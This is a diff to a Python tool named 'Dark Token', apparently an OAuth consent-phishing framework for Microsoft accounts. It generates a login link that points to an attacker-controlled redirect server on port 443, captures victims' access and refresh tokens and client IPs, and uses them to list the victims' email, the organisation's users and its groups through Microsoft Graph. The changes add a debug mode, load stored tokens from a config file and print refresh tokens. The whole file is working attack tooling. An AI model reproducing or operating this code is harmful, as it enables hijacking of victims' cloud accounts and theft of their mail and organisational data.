@@ -42,7 +42,7 @@ from os import system
 
 SIGNAL = ''
 global EMAILDOMAIN
-global TOKENS
+global TOKENS; TOKENS = [];
 global HTTPD
 API = {
 	'base': 'https://graph.microsoft.com/',
@@ -63,6 +63,9 @@ CERT_CONFIG = {
 	'keyfile': 'key.pem',
 	'certfile': 'cert.pem'
 }
+DEBUG = {
+	'debug': 0,
+}
 
 help = """
 
@@ -71,10 +74,11 @@ help = """
 start server         - To start Dark Token server.
 stop server          - To stop Dark Token server.
 list tokens          - To list all tokens.
-list message ID      - To list email messages from a specific account.
+list messages ID      - To list email messages from a specific account.
 list users ID        - To list users of the target organization.
 list groups ID       - To list groups of the target organization.
 list my groups ID    - To list assigned groups of the current account.
+set debug [0|1]      - To enable debug output
 clear                - To clear screen.
 
 [App Configuration]
@@ -104,9 +108,20 @@ if os.path.isfile('autorun.cfg'):
 	configParser = ConfigParser.RawConfigParser()
 	configFilePath = r'autorun.cfg'
 	configParser.read(configFilePath)
-	APP_CONFIG['client_id'] = configParser.get('app-config', 'client_id')
-	APP_CONFIG['client_secret'] = configParser.get('app-config', 'client_secret')
-	APP_CONFIG['redirect_uri'] = configParser.get('app-config', 'redirect_uri')
+	if configParser.get('app-config', 'client_id'):
+		APP_CONFIG['client_id'] = configParser.get('app-config', 'client_id')
+	if configParser.get('app-config', 'client_secret'):
+		APP_CONFIG['client_secret'] = configParser.get('app-config', 'client_secret')
+	if configParser.get('app-config', 'redirect_uri'):
+		APP_CONFIG['redirect_uri'] = configParser.get('app-config', 'redirect_uri')
+	if configParser.get('token-config', 'account'):
+		TOKENS.append([
+			configParser.get('token-config', 'account'),
+			configParser.get('token-config', 'access_token'),
+			configParser.get('token-config', 'id_token'),
+			configParser.get('token-config', 'refresh_token'),
+			configParser.get('token-config', 'CLIENT_IP')
+		])
 
 class AuthorizationHandler(BaseHTTPRequestHandler):
 	def do_GET(self):
@@ -180,25 +195,37 @@ def get_account_messages(access_token):
 	resp = httpRequest(API['base']+API['message'], '', access_token, 'GET')
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
-	return res_json
+	if not DEBUG['debug'] == 0:
+		return resp_body
+	else:
+		return res_json
 
 def get_users(access_token):
 	resp = httpRequest(API['base']+API['users'], '', access_token, 'GET')
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
-	return res_json
+	if not DEBUG['debug'] == 0:
+		return resp_body
+	else:
+		return res_json
 
 def get_groups(access_token):
 	resp = httpRequest(API['base']+API['groups'], '', access_token, 'GET')
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
-	return res_json
+	if not DEBUG['debug'] == 0:
+		return resp_body
+	else:
+		return res_json
 
 def get_mygroups(access_token):
 	resp = httpRequest(API['base']+API['mygroups'], '', access_token, 'GET')
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
-	return res_json
+	if not DEBUG['debug'] == 0:
+		return resp_body
+	else:
+		return res_json
 
 def start_server():
 	global HTTPD
@@ -210,7 +237,7 @@ def start_server():
                 else:
                         try:
                                 HTTPD = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), AuthorizationHandler)
-                                print '[*] Starting Dark Token Server...'
+                                print '[+] Starting Dark Token Server...'
                                 HTTPD.socket = ssl.wrap_socket (HTTPD.socket, keyfile=CERT_CONFIG['keyfile'], certfile=CERT_CONFIG['certfile'], server_side=True)
                                 HTTPD.serve_forever()
                         except:
@@ -240,16 +267,26 @@ while True:
 		try:
 			for i in range(len(TOKENS)):
 				print colors.allwhite + '-' * int(columns) + colors.end
-				print 'ID = [' + str(i) + '] - Account: ' + TOKENS[i][0]['userPrincipalName']
-				print 'Access_Token: ' + TOKENS[i-1][1]
-				print 'Client IP: ' + TOKENS[i-1][4]
+				#print 'ID = [' + str(i) + '] - Account: ' + TOKENS[i][0]['userPrincipalName']
+				print 'ID = [%i] - Account: %s' % (i, TOKENS[i][0])
+				#print 'Access_Token: ' + TOKENS[i-1][1]
+				print 'Access_Token: %s' % TOKENS[i-1][1]
+				#print 'Refresh_Token: ' + TOKENS[i-1][3]
+				print 'Refresh_Token: %s' % TOKENS[i-1][3]
+				#print 'Client IP: ' + TOKENS[i-1][4]
+				print 'Client IP: %s' % TOKENS[i-1][4]
 		except NameError:
 			print '[!] 0 tokens found in the database.'
 			pass
 	elif SIGNAL.__contains__('list users'):
-		id = SIGNAL.split()[2]
+		try:
+			id = SIGNAL.split()[2]
+		except:
+			print '[!] You must specify an array id.  E.g., list userss 0'
 		try:
 			users = get_users(TOKENS[int(id)][1])
+			if not DEBUG['debug'] == 0:
+				print users
 			for i in range(len(users['value'])):
 				print colors.allwhite + '-' * int(columns) + colors.end
 				print colors.white + 'Display Name: ' + str(users['value'][i]['displayName']) + colors.end
@@ -262,27 +299,42 @@ while True:
 		except:
 			print '[!] 0 users found in the database.'
 	elif SIGNAL.__contains__('list groups'):
-		id = SIGNAL.split()[2]
+		try:
+			id = SIGNAL.split()[2]
+		except:
+			print '[!] You must specify an array id.  E.g., list groups 0'
 		try:
 			groups = get_groups(TOKENS[int(id)][1])
+			if not DEBUG['debug'] == 0:
+				print groups
 			for i in range(len(groups['value'])):
 				print colors.allwhite + '-' * int(columns) + colors.end
 				print color.white + str(groups['value'][i])
 		except:
 			print '[!] 0 groups found in the database.'
 	elif SIGNAL.__contains__('list my groups'):
-		id = SIGNAL.split()[3]
+		try:
+			id = SIGNAL.split()[3]
+		except:
+			print '[!] You must specify an array id.  E.g., list my groups 0'
 		try:
 			groups = get_mygroups(TOKENS[int(id)][1])
+			if not DEBUG['debug'] == 0:
+				print groups
 			for i in range(len(groups['value'])):
 				print colors.allwhite + '-' * int(columns) + colors.end
 				print color.white + str(groups['value'][i])
 		except:
 			print '[!] 0 groups found in the database.'
-	elif SIGNAL.__contains__('list message'):
-		id = SIGNAL.split()[2]
+	elif SIGNAL.__contains__('list messages'):
+		try:
+			id = SIGNAL.split()[2]
+		except:
+			print '[!] You must specify an array id.  E.g., list messages 0'
 		try:
 			msg = get_account_messages(TOKENS[int(id)][1])
+			if not DEBUG['debug'] == 0:
+				print msg
 			for i in range(len(msg['value'])):
 				print colors.allwhite + '-' * int(columns) + colors.end
 				print colors.blue + 'Subject: ' + msg['value'][i]['subject'] + colors.end
@@ -310,6 +362,9 @@ while True:
 	elif SIGNAL.__contains__('set redirect_uri'):
 		redirect_uri = SIGNAL.split()[2]
 		APP_CONFIG['redirect_uri'] = redirect_uri
+	elif SIGNAL.__contains__('set debug'):
+		debug = SIGNAL.split()[2]
+		DEBUG['debug'] = debug
 	elif SIGNAL.__contains__('generate link'):
 		try:
 			print "\nhttps://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=%s&response_type=code&redirect_uri=%s&response_mode=query&scope=%s&state=12345\n" % (str(APP_CONFIG['client_id']), urllib.quote(APP_CONFIG['redirect_uri']), urllib.quote(APP_CONFIG['scope']))
